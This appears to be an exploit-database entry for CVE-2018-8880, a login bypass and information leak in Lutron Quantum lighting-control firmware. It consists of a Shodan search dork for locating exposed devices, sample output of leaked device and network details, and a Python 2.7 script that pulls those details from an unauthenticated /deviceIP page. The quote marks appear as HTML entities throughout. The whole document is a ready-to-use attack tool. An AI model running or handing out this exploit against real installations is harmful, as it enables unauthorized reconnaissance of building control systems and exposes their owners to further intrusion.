 
# Exploit Title: Login bypass and data leak - Lutron Quantum 2.0 - 3.2.243 firmware
# Date: 20-03-2018
# Exploit Author: David Castro
# Contact: https://twitter.com/SadFud75
# Vendor Homepage: http://www.lutron.com
# Software Link: http://www.lutron.com/en-US/Products/Pages/WholeBuildingSystems/Quantum/Overview.aspx
# Version: Lutron Quantum 2.0 - 3.2.243 firmware
# CVE : CVE-2018-8880
# Shodan dork: html:"<h1>LUTRON</h1>"
 
Python 2.7 Output:
 
Leaking data from HOST
[+] Device info:
 
MAC: 000FE702A999
PRODUCT FAMILY: Gulliver
PRODUCT TYPE: Processor
SERIAL NUMBER: 007B24B4
GUID: 0DFB959BD0D8784DA9501B958F099779
CODE VERSION: 7.5.0
 
[+] Network info:
 
INTERNAL IP: 192.168.0.2
SUBNET MASK: 255.255.255.0
GATEWAY: 192.168.0.1
TELNET PORT: 23
FTP PORT: 21
REMOTE PORT: 51023
 
[+] Done.
 
&#039;&#039;&#039;
 
 
import requests
from bs4 import BeautifulSoup
 
ip = raw_input("Enter target ip: ")
port = raw_input("Enter target port: ")
 
print &#039;Leaking data from &#039; + &#039;http://&#039; + ip + ":" + port
r = requests.get(&#039;http://&#039; + ip + ":" + port + &#039;/deviceIP&#039;)
resultado = r.text
parseado = BeautifulSoup(resultado, "lxml")
 
print &#039;[+] Device info:&#039;
print &#039;&#039;
print &#039;MAC: &#039; + parseado.find(&#039;input&#039;, {&#039;name&#039;: &#039;MacAddr&#039;}).get(&#039;value&#039;)
print &#039;PRODUCT FAMILY: &#039; + parseado.find(&#039;input&#039;, {&#039;name&#039;: &#039;PRODFAM&#039;}).get(&#039;value&#039;)
print &#039;PRODUCT TYPE: &#039; + parseado.find(&#039;input&#039;, {&#039;name&#039;: &#039;PRODTYPE&#039;}).get(&#039;value&#039;)
print &#039;SERIAL NUMBER: &#039; + parseado.find(&#039;input&#039;, {&#039;name&#039;: &#039;SERNUM&#039;}).get(&#039;value&#039;)
print &#039;GUID: &#039; + parseado.find(&#039;input&#039;, {&#039;name&#039;: &#039;GUID&#039;}).get(&#039;value&#039;)
print &#039;CODE VERSION: &#039; + parseado.find(&#039;input&#039;, {&#039;name&#039;: &#039;CODEVER&#039;}).get(&#039;value&#039;)
print &#039;&#039;
print &#039;[+] Network info:&#039;
print &#039;&#039;
print &#039;INTERNAL IP: &#039; + parseado.find(&#039;input&#039;, {&#039;name&#039;: &#039;IPADDR&#039;}).get(&#039;value&#039;)
print &#039;SUBNET MASK: &#039; + parseado.find(&#039;input&#039;, {&#039;name&#039;: &#039;SUBNETMK&#039;}).get(&#039;value&#039;)
print &#039;GATEWAY: &#039; + parseado.find(&#039;input&#039;, {&#039;name&#039;: &#039;GATEADDR&#039;}).get(&#039;value&#039;)
print &#039;TELNET PORT: &#039; + parseado.find(&#039;input&#039;, {&#039;name&#039;: &#039;TELPORT&#039;}).get(&#039;value&#039;)
print &#039;FTP PORT: &#039; + parseado.find(&#039;input&#039;, {&#039;name&#039;: &#039;FTPPORT&#039;}).get(&#039;value&#039;)
print &#039;REMOTE PORT: &#039; + parseado.find(&#039;input&#039;, {&#039;name&#039;: &#039;REMOTEPORT&#039;}).get(&#039;value&#039;)
print &#039;&#039;
print &#039;[+] Done.&#039;
print &#039;&#039;

